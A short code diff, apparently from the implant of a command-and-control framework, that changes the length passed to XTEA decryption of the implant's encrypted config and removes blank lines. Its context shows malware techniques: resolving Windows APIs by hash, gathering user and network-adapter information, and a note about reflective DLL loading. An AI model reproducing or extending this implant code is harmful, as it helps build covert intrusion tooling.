@@ -67,7 +67,7 @@ namespace Implant {
         x_memcpy(&Ctx->Root, &pRoot, 1);
 
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
-        Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length, Ctx->Config.Key, FALSE);
+        Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
 
         // todo: reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
@@ -98,10 +98,8 @@ namespace Implant {
             !(FPTR(Ctx->win32.WinHttpQueryDataAvailable, Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
             !(FPTR(Ctx->win32.WinHttpCloseHandle, Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
             !(FPTR(Ctx->win32.GetAdaptersInfo, Ctx->Modules.iphl, GETADAPTERSINFO)) ||
-
             !(FPTR(Ctx->win32.CryptStringToBinaryA, Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
             !(FPTR(Ctx->win32.CryptBinaryToStringA, Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
-
             !(FPTR(Ctx->win32.GetUserNameA, Ctx->Modules.advapi, GETUSERNAMEA)) ||
             !(FPTR(Ctx->win32.LookupAccountSidW, Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
             !(FPTR(Ctx->win32.LookupPrivilegeValueA, Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
